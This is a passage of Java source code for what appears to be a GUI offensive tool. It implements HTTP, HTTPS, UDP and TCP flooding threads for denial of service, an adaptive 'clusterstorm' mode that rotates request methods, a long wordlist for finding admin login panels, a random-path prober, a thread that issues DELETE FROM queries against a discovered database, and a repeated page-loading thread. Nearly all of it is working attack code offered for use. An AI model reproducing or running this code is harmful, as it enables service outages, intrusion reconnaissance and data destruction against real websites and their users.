		SubsiteFinderThread thread = new SubsiteFinderThread();
        thread.start();
		}
		}
		
		
		
		
	}
	
	public static void clusterstorm() throws Exception{
		
		doingddos=true;
		threads = Integer.parseInt(threadsfield.getText());
		
		
		
		if(messagefield.getText().equalsIgnoreCase("http")){
			CheckHttpMethods();
		for (int i = 0; i < threads; i++) {
			DdosHttpThread thread = new DdosHttpThread();
	        thread.start();
		}
		}
		
		
		if(messagefield.getText().equalsIgnoreCase("https")){
			CheckHttpsMethods();
			for (int i = 0; i < threads; i++) {
				DdosHttpsThread thread = new DdosHttpsThread();
		        thread.start();
		}
		}
		
		
		
	}
	
	public static void CheckHttpMethods() throws Exception{
		
		availablemethods.clear();
		String httpmethods[] = {"GET","POST","PUT","TRACE","CONNECT","DELETE"};
		URL url = new URL(ipfield.getText());
        String param = "param1=" + URLEncoder.encode("87845", "UTF-8");
		
		for (int i = 0; i < httpmethods.length; i++) {
			try{
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
    	    connection.setDoOutput(true);
	        connection.setDoInput(true);
	        connection.setRequestMethod(httpmethods[i]);
	        connection.setRequestProperty("charset", "utf-8");
	        connection.setRequestProperty("Host", "localhost");
	        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
	        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
	        connection.setRequestProperty("Content-Length", param);
	        connection.setRequestProperty("Accept-Encoding", "gzip");
	        connection.setReadTimeout(0);
	        connection.setConnectTimeout(0);
	        connection.setUseCaches(false);
	        System.out.println(connection.getResponseCode());
			
	        if (connection.getResponseCode()==200) {
				availablemethods.add(httpmethods[i]);
			}
			Thread.sleep(100);
			}catch(Exception e1){e1.printStackTrace();}
		}
		
	
	}//end of CheckHttpMethods
	
	public static void CheckHttpsMethods() throws Exception{
		
		availablemethods.clear();
		String httpsmethods[] = {"GET","POST","PUT","TRACE","CONNECT","DELETE"};
		URL url = new URL(ipfield.getText());
        String param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        SSLSocketFactory sslsocketfactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
		
		for (int i = 0; i < httpsmethods.length; i++) {
			try{
			HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
			connection.setSSLSocketFactory(sslsocketfactory);
    	    connection.setDoOutput(true);
	        connection.setDoInput(true);
	        connection.setRequestMethod(httpsmethods[i]);
	        connection.setRequestProperty("charset", "utf-8");
	        connection.setRequestProperty("Host", "localhost");
	        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
	        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
	        connection.setRequestProperty("Content-Length", param);
	        connection.setRequestProperty("Accept-Encoding", "gzip");
	        connection.setReadTimeout(0);
	        connection.setConnectTimeout(0);
	        connection.setUseCaches(false);
	        System.out.println(connection.getResponseCode());
			
	        if (connection.getResponseCode()==200) {
				availablemethods.add(httpsmethods[i]);
			}
			Thread.sleep(100);
			}catch(Exception e1){e1.printStackTrace();}
		}
		
	
	}//end of CheckHttpsMethods
	
	public static void adminfinder() throws Exception{
		
		
		String[] adminpanelarray = { "/admin.aspx","/admin.asp","/admin.php","/admin/","/administrator/",
                "/moderator/","/webadmin/","/adminarea/",
                "/bb-admin/","/adminLogin/","/admin_area/",
                "/panel-administracion/","/instadmin/",
                "/memberadmin/","/administratorlogin/",
                "/adm/","/admin/account.php","/admin/index.php",
                "/admin/login.php","/admin/admin.php",
                "/admin/account.php","/joomla/administrator",
                "/login.php","/admin_area/admin.php",
                "/admin_area/login.php","/siteadmin/login.php",
                "/siteadmin/index.php","/siteadmin/login.html",
                "/admin/account.html","/admin/index.html",
                "/admin/login.html","/admin/admin.html",
                "/admin_area/index.php","/bb-admin/index.php",
                "/bb-admin/login.php","/bb-admin/admin.php",
                "/admin/home.php","/admin_area/login.html",
                "/admin_area/index.html","/admin/controlpanel.php",
                "/admincp/index.asp","/admincp/login.asp",
                "/admincp/index.html","/admin/account.html",
                "/adminpanel.html","/webadmin.html","webadmin/index.html",
                "/webadmin/admin.html","/webadmin/login.html",
                "/admin/admin_login.html","/admin_login.html",
                "/panel-administracion/login.html",
                "/admin/cp.php","cp.php","/administrator/index.php",
                "/administrator/login.php","/nsw/admin/login.php",
                "/webadmin/login.php","/admin/admin_login.php",
                "/admin_login.php","/administrator/account.php",
                "/administrator.php","/admin_area/admin.html",
                "/pages/admin/admin-login.php","/admin/admin-login.php",
                "/admin-login.php","/bb-admin/index.html",
                "/bb-admin/login.html","/bb-admin/admin.html",
                "/admin/home.html","/modelsearch/login.php","/moderator.php",
                "/moderator/login.php","/moderator/admin.php",
                "/account.php","/pages/admin/admin-login.html",
                "/admin/admin-login.html","/admin-login.html",
                "/controlpanel.php","/admincontrol.php",
                "/admin/adminLogin.html","/adminLogin.html",
                "/admin/adminLogin.html","/home.html",
                "/rcjakar/admin/login.php","/adminarea/index.html",
                "/adminarea/admin.html","/webadmin.php","/webadmin/index.php",
                "/webadmin/admin.php","/admin/controlpanel.html",
                "/admin.html","/admin/cp.html","cp.html",
                "/adminpanel.php","/moderator.html",
                "/administrator/index.html","/administrator/login.html",
                "/user.html","/administrator/account.html",
                "/administrator.html","/login.html","/modelsearch/login.html",
                "/moderator/login.html","/adminarea/login.html",
                "/panel-administracion/index.html",
                "/panel-administracion/admin.html","/modelsearch/index.html",
                "/modelsearch/admin.html","/admincontrol/login.html"
                ,"/adm/index.html","/adm.html","/moderator/admin.html",
                "/user.php","/account.html","/controlpanel.html",
                "/admincontrol.html","/panel-administracion/login.php",
                "/wp-login.php","/adminLogin.php","/admin/adminLogin.php",
                "/home.php","/adminarea/index.php","/adminarea/admin.php",
                "/adminarea/login.php","/panel-administracion/index.php",
                "/panel-administracion/admin.php",
                "/modelsearch/index.php","/modelsearch/admin.php",
                "/admincontrol/login.php","/adm/admloginuser.php",
                "/admloginuser.php","/admin2.php","/admin2/login.php",
                "/admin2/index.php","adm/index.php","adm.php","affiliate.php"
                ,"/adm_auth.php","/memberadmin.php","/administratorlogin.php",
                "/login/admin.asp", "/admin/login.asp", "/administratorlogin.asp",
                "/login/asmindstrator.asp", "/admin/login.aspx","/login/admin.aspx",
                "/administartorlogin.aspx","login/administrator.aspx",
                "/adminlogin.asp", "a/dminlogin.aspx","/admin_login.asp",
                "/admin_login.aspx","/adminhome.asp","/adminhome.aspx",
                "/administrator_login.asp","/administrator_login.aspx" };
		
		
		String param = "param1=" + URLEncoder.encode("87845", "UTF-8");
		
		try{
		for (int i = 0; i < adminpanelarray.length; i++) {
		
		URL url = new URL(ipfield.getText()+adminpanelarray[i]);
		HttpURLConnection connection = (HttpURLConnection) url.openConnection();
	    connection.setDoOutput(true);
        connection.setDoInput(true);
        connection.setRequestMethod("GET");
        connection.setRequestProperty("charset", "utf-8");
        connection.setRequestProperty("Host", "localhost");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setRequestProperty("Content-Length", param);
        connection.setRequestProperty("Accept-Encoding", "gzip");
        connection.setReadTimeout(0);
        connection.setConnectTimeout(0);
        connection.setUseCaches(false);
		
		if (connection.getResponseCode()==200) {
			adminpanellist.add(ipfield.getText()+adminpanelarray[i]);
		}
		
		
		}
		}catch(Exception e){}
		
		StringBuilder sb = new StringBuilder();
		sb.append("< Admin panels found below >\n");
		for (int i = 0; i < adminpanellist.size(); i++) {
			sb.append(adminpanellist.get(i)+"\n");
		}
		
		outputarea.setText(sb.toString());
		
		JFrame f = new JFrame("Admin Panels");
		f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		f.setSize(450, 580);
		f.setLocationRelativeTo(null);
		f.setResizable(false);
		
		outputarea.setBackground(Color.black);
		outputarea.setForeground(Color.green);
		
		JPanel outputpanel = new JPanel();
		outputpanel.setBackground(Color.black);
		outputpanel.setLayout(new FlowLayout());
		outputpanel.add(outputarea);
		
		
		f.add(outputpanel);
		f.setVisible(true);
		
		
	}//end of admin finder
	
	
	
	
	
	public static class DdosHttpThread extends Thread {

	   
	    private final String request = ipfield.getText();
	    private final URL url;

	    String param = null;

	    public DdosHttpThread() throws Exception {
	        url = new URL(request);
	        param = "param1=" + URLEncoder.encode("87845", "UTF-8");
	    }


	    @Override
	    public void run() {
	    	if(rb6.isSelected()==false){
	        while (doingddos==true) {
	        	try {
	        	    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
	        	    connection.setDoOutput(true);
	    	        connection.setDoInput(true);
	    	        connection.setRequestMethod(messagefield.getText());
	    	        connection.setRequestProperty("charset", "utf-8");
	    	        connection.setRequestProperty("Host", "localhost");
	    	        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
	    	        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
	    	        connection.setRequestProperty("Content-Length", param);
	    	        connection.setRequestProperty("Accept-Encoding", "gzip");
	    	        connection.setReadTimeout(1);
	    	        connection.setConnectTimeout(0);
	    	        connection.setUseCaches(false);
	    	        
	    	        if((messagefield.getText().equals("POST") || messagefield.getText().equals("PUT")) && bytesfield.getText().equals("null")==false){
	    	        	
	    	        DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
	    	        GZIPOutputStream gout = new GZIPOutputStream(outputStream);
	    	        gout.write(bytesfield.getText().getBytes());
	    	        gout.finish();
	    	        gout.flush();
	    	        
	                }
	    	        
	    	        System.out.println(connection.getResponseCode());
	        	} catch (Exception e) {e.printStackTrace();}
	        }
	    	}//end of http attack
	    	else{
	        while (doingddos==true) {
	        	try {
        	    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        	    connection.setDoOutput(true);
    	        connection.setDoInput(true);
    	        connection.setRequestMethod(availablemethods.get(r.nextInt(availablemethods.size())));
    	        connection.setRequestProperty("charset", "utf-8");
    	        connection.setRequestProperty("Host", "localhost");
    	        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
    	        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
    	        connection.setRequestProperty("Content-Length", param);
    	        connection.setRequestProperty("Accept-Encoding", "gzip");
    	        connection.setReadTimeout(0);
    	        connection.setConnectTimeout(0);
    	        connection.setUseCaches(false);
    	        
    	        if(bytesfield.getText().equalsIgnoreCase("auto")){
    	        try{
    	        System.out.println(connection.getResponseCode());
    	        clusterstormhit++;
    	        }catch(Exception e){
    	        clusterstormexception++;
    	        }
    	        
    	        exceptiondividehit = clusterstormexception/clusterstormhit;
    	        
    	        if( exceptiondividehit<=1 ){ dynamicclusterdelay+=15; }
    	        else{ dynamicclusterdelay-=0.01; }
	        	
    	        try{Thread.sleep(dynamicclusterdelay);}catch(IllegalArgumentException e2){resetclusterstorm();}
    	        
    	        }else{
    	        	System.out.println(connection.getResponseCode());
    	        	Thread.sleep(Integer.valueOf(bytesfield.getText()));
    	        }
	        	} catch (Exception e) {e.printStackTrace();}
        }
	    	}//end of clusterstorm http
	        
	        
	               
	            

	            


	    }  
	    

	    
	}//end of ddos http thread
	
	
	public static class DdosHttpsThread extends Thread {

		   
	    private final String request = ipfield.getText();
	    private final URL url;

	    String param = null;

	    public DdosHttpsThread() throws Exception {
	        url = new URL(request);
	        param = "param1=" + URLEncoder.encode("87845", "UTF-8");
	    }


	    @Override
	    public void run() {
	    	if(rb6.isSelected()==false){
	    		SSLSocketFactory sslsocketfactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
	    	//	InetSocketAddress proxyInet = new InetSocketAddress("10.100.21.11",80);
	    	//	Proxy proxy = new Proxy(Proxy.Type.HTTP, proxyInet);
	        while (doingddos==true) {
	        	try {
	        	    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
	        	    connection.setSSLSocketFactory(sslsocketfactory);
	        	    connection.setDoOutput(true);
	    	        connection.setDoInput(true);
	    	        connection.setRequestMethod(messagefield.getText());
	    	        connection.setRequestProperty("charset", "utf-8");
	    	        connection.setRequestProperty("Host", "localhost");
	    	        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
	    	        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
	    	        connection.setRequestProperty("Content-Length", param);
	    	        connection.setRequestProperty("Accept-Encoding", "gzip");
	    	        connection.setReadTimeout(1);
	    	        connection.setConnectTimeout(0);
	    	        connection.setUseCaches(false);
	    	        
	    	        if((messagefield.getText().equals("POST") || messagefield.getText().equals("PUT")) && bytesfield.getText().equals("null")==false){
	    	        	
	    	        DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
	    	        GZIPOutputStream gout = new GZIPOutputStream(outputStream);
	    	        gout.write(bytesfield.getText().getBytes());
	    	        gout.finish();
	    	        gout.flush();
	    	        
	                }
	    	        
	    	        System.out.println(connection.getResponseCode());
	        	} catch (Exception e) {e.printStackTrace();}
	        }
	    	}//end of https attack
	    	else{
	    		SSLSocketFactory sslsocketfactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
	        while (doingddos==true) {
	        	try {
        	    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
        	    connection.setSSLSocketFactory(sslsocketfactory);
        	    connection.setDoOutput(true);
    	        connection.setDoInput(true);
    	        connection.setRequestMethod(availablemethods.get(r.nextInt(availablemethods.size())));
    	        connection.setRequestProperty("charset", "utf-8");
    	        connection.setRequestProperty("Host", "localhost");
    	        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
    	        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
    	        connection.setRequestProperty("Content-Length", param);
    	        connection.setRequestProperty("Accept-Encoding", "gzip");
    	        connection.setReadTimeout(0);
    	        connection.setConnectTimeout(0);
    	        connection.setUseCaches(false);
    	        
    	        if(bytesfield.getText().equalsIgnoreCase("auto")){
        	        try{
        	        System.out.println(connection.getResponseCode());
        	        
        	        clusterstormhit++;
        	        }catch(Exception e){
        	        clusterstormexception++;
        	        }
        	        
        	        exceptiondividehit = clusterstormexception/clusterstormhit;
        	        
        	        if( exceptiondividehit<=1 ){ dynamicclusterdelay+=8; }
        	        else{ dynamicclusterdelay-=0.25; }
    	        	
        	        try{Thread.sleep(dynamicclusterdelay);}catch(IllegalArgumentException e2){resetclusterstorm();}
        	        
        	        }else{
        	        	System.out.println(connection.getResponseCode());
        	        	Thread.sleep(Integer.valueOf(bytesfield.getText()));
        	        }
    	        
	        	} catch (Exception e) {e.printStackTrace();}
        }
	    		
	    	}//end of clusterstorm https
	        
	        
	               
	            

	            


	    }  
	    

	    
	}//end of ddos https thread
	
	
	
	
	
	public static class DdosUdpThread extends Thread {

		   
	    private final String request = ipfield.getText();
	    
	    
	    

	    public DdosUdpThread() throws Exception {

	        
	    }


	    @Override
	    public void run() {
	       
	            try {
	            	
	            	byte[] buffer = messagefield.getText().getBytes();
	    			InetAddress receiverAddress = InetAddress.getByName(request);
	    			DatagramSocket dsocket = new DatagramSocket();
	    			DatagramPacket packet = new DatagramPacket(buffer, buffer.length, receiverAddress, 80);
	    	    			
	    			
	    		    while(doingddos==true){
	    				dsocket.send(packet);
	    		  }  
	    		    
	    		    
	            	
	            	
	            } catch (Exception e) {e.printStackTrace();}

	            


	        
	    }
	
	
	}//end of ddos udp thread
	
	public static class DdosTcpThread extends Thread {

	    public DdosTcpThread() throws Exception {

	        
	    }


	    @Override
	    public void run() {
	       
	            try {
	               
	            	 Socket socket = new Socket(ipfield.getText(), 80);
	    			 DataOutputStream outstream = new DataOutputStream(socket.getOutputStream());
	    			 byte[] buffer = new byte[Integer.parseInt(bytesfield.getText())];
	    			 
	    		    while(doingddos==true){
	    				outstream.write(buffer);
	    				outstream.flush();
	    		  }  
	    		    outstream.close();
	    		    socket.close();
	            } catch (Exception e) {e.printStackTrace();}

	          
	    }
	
	}//end of ddos tcp thread
	
	
		public static class SubsiteFinderThread extends Thread {

	    public SubsiteFinderThread() throws Exception {

	        
	    }


	    @Override
	    public void run() {
	       
	    	while(doingddos==true){
	    		try{
	    			
	    		
	    		StringBuilder sb = new StringBuilder();
	    		//0 rakam 48 to 57
	    		//1 kucuk harf 97 to 122
	    		//2 buyuk harf 65 to 90
	    		for (int i = 0; i < r.nextInt(12); i++) {
	    			
	    			int anyfromthree = r.nextInt(3);
	    			
	    			if (anyfromthree==0) {
	    				sb.append((char)(r.nextInt(10)+48));
	    			}
	    			if (anyfromthree==1) {
	    				sb.append((char)(r.nextInt(26)+97));
	    			}
	    			if (anyfromthree==2) {
	    				sb.append((char)(r.nextInt(26)+65));
	    			}
	    			
	    		}
	    		
	    		String generatedurl = sb.toString();
	    		
	    		String request = ipfield.getText()+generatedurl+".php";
	    	    URL url = new URL(request);
	    	    
	    		
	    		String param = "param1=" + URLEncoder.encode("87845", "UTF-8");
	    		HttpURLConnection connection = (HttpURLConnection) url.openConnection();
	    	    connection.setDoOutput(true);
	            connection.setDoInput(true);
	            connection.setRequestMethod("POST");
	            connection.setRequestProperty("charset", "utf-8");
	            connection.setRequestProperty("Host", "localhost");
	            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
	            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
	            connection.setRequestProperty("Content-Length", param);
	            connection.setUseCaches(false);
	            
	            System.out.println(generatedurl);
	            System.out.println(connection.getResponseCode());
	            
	            if(connection.getResponseCode()==200){
	            	JOptionPane.showMessageDialog(null, request);
	            	
	            }
	            
	    		}catch(Exception e1){e1.printStackTrace();}
	    		
	    		
	    		}
	            


	        
	    }
	
	
	}//end of subsite finder thread
		
		
		public static class SQLThread extends Thread {

		    public SQLThread() throws Exception {

		        
		    }

		    @Override
		    public void run() {
		    	
		    	while(doingddos==true){
		    		
		    		try{
		    			
		    			databasefinder();
		    	
		    		if(databaseurl.equals(null)==false){
		                //delete query
				        Connection conn = DriverManager.getConnection(databaseurl); 
						String sql = "DELETE FROM "+bytesfield.getText();
						PreparedStatement statement = conn.prepareStatement(sql);
						statement.executeUpdate();
		    		}
		            } catch (Exception e) {e.printStackTrace();}
		    		
		            
		    }
		
		    }
		}//end of SQL thread
		
		
		public static class IModThread extends Thread {

		    public IModThread() throws Exception {

		        
		    }

		    @Override
		    public void run() {
		    	
		    	while(doingddos==true){
		    		
		    		try{
		    		
		    			
		    		  for (int i = 0; i < Integer.parseInt(messagefield.getText()); i++) {
						
		    			JEditorPane website = new JEditorPane(ipfield.getText());
				        website.setContentType("text/html");
		
					  }
		    		
			        
		    		} catch (Exception e) {e.printStackTrace();}
		    		
		    		try{Thread.sleep(Integer.parseInt(bytesfield.getText()));}catch(Exception e2){e2.printStackTrace();}
		            
		        }
		
		    }
		}//end of IMod thread
		
		


	}
    
	